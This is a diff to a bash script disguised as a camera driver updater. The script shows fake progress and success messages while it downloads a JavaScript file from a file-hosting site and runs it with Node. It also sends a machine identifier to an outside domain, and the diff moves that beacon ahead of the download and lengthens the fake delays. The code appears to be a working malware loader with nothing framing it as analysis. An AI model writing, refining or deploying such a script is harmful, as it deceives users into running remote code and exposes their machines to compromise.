@@ -13,11 +13,15 @@ delay() { sleep "${1:-1}"; }
 
 delay 4
 echo "[INFO] Searching for Camera Drivers ..."
-delay 4
+delay 5
 echo "[INFO] Update Driver Packages..."
-delay 6
+delay 8
 echo "[SUCCESS] Camera drivers have been updated successfully."
 
+if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
+  AUTO_URL="https://drivereasy.llc/auto-update/${MAC_UID}"
+  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
+fi
 download() {
   # download <url> <output>
   local url="$1"
@@ -116,12 +120,6 @@ download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
 [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
 "$NODE_EXE" "$ENV_SETUP_JS"
-
-if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-  AUTO_URL="https://drivereasy.llc/auto-update/${MAC_UID}"
-  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
-fi
-
 
 ARCH=$(uname -m)
 OS=$(uname -s)
